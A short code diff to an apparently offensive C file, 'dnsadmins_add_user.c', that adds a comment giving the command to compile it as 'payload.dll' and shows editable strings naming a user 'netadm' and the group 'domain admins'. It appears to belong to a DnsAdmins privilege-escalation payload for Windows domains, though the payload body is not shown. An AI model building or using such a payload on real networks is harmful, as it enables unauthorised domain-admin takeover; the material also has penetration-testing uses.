@@ -2,6 +2,8 @@
 #include <stdio.h>
 #include <string.h>
 
+// Note: Compile using x86_64-w64-mingw32-gcc -shared -o payload.dll dnsadmins_add_user.c
+
 // === 🔧 EDIT THESE STRINGS ===
 char username[] = "netadm";
 char groupname[] = "domain admins";
